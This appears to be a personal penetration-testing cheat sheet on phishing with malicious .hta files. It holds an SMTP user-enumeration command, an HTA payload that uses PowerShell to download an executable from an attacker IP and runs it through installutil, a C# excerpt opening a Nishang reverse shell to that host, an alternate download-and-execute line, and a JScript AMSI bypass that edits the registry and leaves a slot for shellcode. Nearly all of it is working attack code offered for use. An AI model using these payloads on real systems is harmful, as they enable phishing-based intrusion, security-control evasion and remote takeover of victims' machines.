## Phishing via .hta files

- if Office does not appear to be working for you, can try sending an email with a malicious .hta file link.

### Enumerating email users

Try using smtp-user-enum with the Seclists's names.txt
For the mode, use telnet to connect and try VRFY, EXPN and RCPT to see which works

```bash
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -D tricky.com -t 192.168.174.159
```

### PowerShell Download Exe + InstalUtil to run Powershell
- if IEX is blocked, then no gucci. but can try putting the entire nishang (obfuscated) powershell rev shell straight into bypass.exe (see example below)

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell wget http://192.168.45.196/bypass.exe -o C:\\Windows\\tasks\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\tasks\\bypass.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>

```
Except from bypass.exe with nishang
```csharp
String cmd2 = "$cli = New-Object Net.Sockets.TCPClient('192.168.45.196', 443);$NStream = $cli.GetStream();<snip>....";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd1);
```

if the above doesnt work try
```
var ress = shell.Run("powershell.exe wget http://172.21.23.10/inj_runner.exe -o C:\\users\\public\\runner.exe; C:\\users\\public\\runner.exe");
```

### jscript shellcode runner from .hta
- slam your shellcode inside the .hta with AMSI bypass
```js
//Amsi Bypass Block (may need to play around with the key strings and variables)

var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\A"+"m"+"siE"+"na"+"ble";

//if AmsiEnable does not exist, throw an error which then goes to the catch
try{
	var AmsiEnable = sh.RegRead(key);
	if(AmsiEnable!=0){
	throw new Error(1, '');
	}
}catch(e){
	sh.RegWrite(key, 0, "REG_DWORD");
	//cscript is the cli version of wscript
	//we need to provide the GUID of HKLM\Software\Classes\CLSID
	//inside would be jscript.dll
	sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} "+WScript.ScriptFullName,0,1);
	sh.RegWrite(key, 1, "REG_DWORD");
	WScript.Quit(1);
}

< put the dotnet2js shellcode here>
```
if it does not work then host this as a .js file on your apache server and have your .hta download the .js and execute via Wscript